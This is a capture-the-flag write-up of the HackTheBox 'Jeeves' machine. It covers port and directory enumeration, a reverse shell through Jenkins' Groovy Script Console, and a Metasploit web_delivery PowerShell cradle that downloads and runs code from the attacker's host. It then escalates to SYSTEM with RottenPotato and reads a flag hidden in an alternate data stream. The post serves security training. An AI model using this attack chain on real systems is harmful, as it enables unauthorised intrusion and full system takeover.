---
layout: post
title: Hackthebox Jeeves Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of machine "Jeeves" on that website.<br>

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.63  -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-15 09:22 EEST
Nmap scan report for 10.10.10.63
Host is up (0.035s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h02m47s, deviation: 0s, median: 5h02m47s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-15T11:27:35
|_  start_date: 2019-09-15T11:16:56

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.41 seconds
{% endhighlight %}

SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.63
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
{% endhighlight %}

Gobuster port 80:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .aspx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.63
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx
[+] Timeout:        10s
===============================================================
2019/09/15 09:42:40 Starting gobuster
===============================================================
===============================================================
2019/09/15 10:08:35 Finished
===============================================================
{% endhighlight %}

Gobuster port 50000:
{% highlight shell %}
root@kali:~# gobuster dir -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .aspx
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.63:50000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     aspx
[+] Timeout:        10s
===============================================================
2019/09/15 10:09:01 Starting gobuster
===============================================================
/askjeeves (Status: 302)
===============================================================
2019/09/15 10:34:51 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

On port 50000, we can find Jenkins dashboard on "/askjeeves".<br>
Besides, there is an interesting menu "Manage Jenkins".
![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)

After that, we can find a menu "Script Console".<br>
This allows us to run any <a href="https://groovy-lang.org/">Groovy</a> script.
![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)

To get a reverse shell, we need to launch netcat and prepare a payload.<br>
We can find it from <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">Github repository</a>.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-09-15/jeeves-badge.png)

Now we got a reverse shell which is "" user.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
{% endhighlight %}

user.txt is in the directory "".
{% highlight shell %}
C:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\kohsuke\Desktop

11/03/2017  11:19 PM    <DIR>          .
11/03/2017  11:19 PM    <DIR>          ..
11/03/2017  11:22 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   7,475,908,608 bytes free

C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a
{% endhighlight %}

### 3. Getting Root

We have reverse shell already.<br>
For the further enumeration, gain meterpreter shell with Metasploit module "Web_delivery".
{% highlight shell %}
msf5 > use exploit/multi/script/web_delivery 

msf5 exploit(multi/script/web_delivery) > set target 2
target => 2

msf5 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf5 exploit(multi/script/web_delivery) > set lhost 10.10.14.19
lhost => 10.10.14.19

msf5 exploit(multi/script/web_delivery) > set srvhost 10.10.14.19
srvhost => 10.10.14.19

msf5 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.19:4444
[*] Using URL: http://10.10.14.19:8080/3FtokPLmY
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $q=new-object net.webclient;$q.proxy=[Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $q.downloadstring('http://10.10.14.19:8080/3FtokPLmY');
{% endhighlight %}

Now we had a command to run meterpreter shell.<br>
Then, run the obtained command on the current reverse shell.
{% highlight shell %}
C:\Users\kohsuke\Desktop>powershell.exe -nop -w hidden -c $q=new-object net.webclient;$q.proxy=[Net.WebRequest]::GetSystemWebProxy();$q.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $q.downloadstring('http://10.10.14.19:8080/3FtokPLmY');
{% endhighlight %}

In the msfconsole window, we can confirm that we had new meterpreter session.
{% highlight shell %}
msf5 exploit(multi/script/web_delivery) > [*] 10.10.10.63      web_delivery - Delivering Payload (1941) bytes
[*] Sending stage (179779 bytes) to 10.10.10.63
[*] Meterpreter session 1 opened (10.10.14.19:4444 -> 10.10.10.63:49678) at 2019-09-15 13:14:31 +0300
{% endhighlight %}

With following command, we can open the session.
{% highlight shell %}
msf5 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
{% endhighlight %}

By "getprivs" command, we can achieve privilege information.<br>
As we can see, we have "SeImpersonatePrivilege".
{% highlight shell %}
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
{% endhighlight %}

This means that we can use <a href="https://foxglovesecurity.com/20A16/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato</a> to gain a privileged account.<br>
we need to clone the repository at first.
{% highlight shell %}
root@kali:~# git clone https://github.com/foxglovesec/RottenPotato
Cloning into 'RottenPotato'...
remote: Enumerating objects: 426, done.
remote: Total 426 (delta 0), reused 0 (delta 0), pack-reused 426
Receiving objects: 100% (426/426), 2.56 MiB | 4.59 MiB/s, done.
Resolving deltas: 100% (128/128), done.
{% endhighlight %}

Then, achieve a token for SYSTEM user with the following procedure.
{% highlight shell %}
meterpreter > upload /root/RottenPotato/rottenpotato.exe .
[*] uploading  : /root/RottenPotato/rottenpotato.exe -> .
[*] uploaded   : /root/RottenPotato/rottenpotato.exe -> .\rottenpotato.exe

meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > execute -Hc -f rottenpotato.exe
Process 784 created.
Channel 2 created.

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
{% endhighlight %}

Generally, we have "root.txt" in the Desktop directory of user "Administrator".<br>
However, this time we see nothing but strange "hm.txt".
{% highlight shell %}
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  797   fil   2017-11-08 16:05:18 +0200  Windows 10 Update Assistant.lnk
100666/rw-rw-rw-  282   fil   2017-11-04 04:03:17 +0200  desktop.ini
100444/r--r--r--  36    fil   2017-11-04 04:57:21 +0200  hm.txt

meterpreter > cat hm.txt
The flag is elsewhere.  Look deeper.
{% endhighlight %}

Sounds like there is nothing here.<br>
However, by with "\R" option, we can find something interesting.
{% highlight shell %}
meterpreter > shell
Process 4384 created.
Channel 4 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.


C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,474,098,176 bytes free
{% endhighlight %}

With "more" command, we can see the content.
{% highlight shell %}
C:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
afbc5bd4b615a60648cec41c6ac92530
{% endhighlight %}
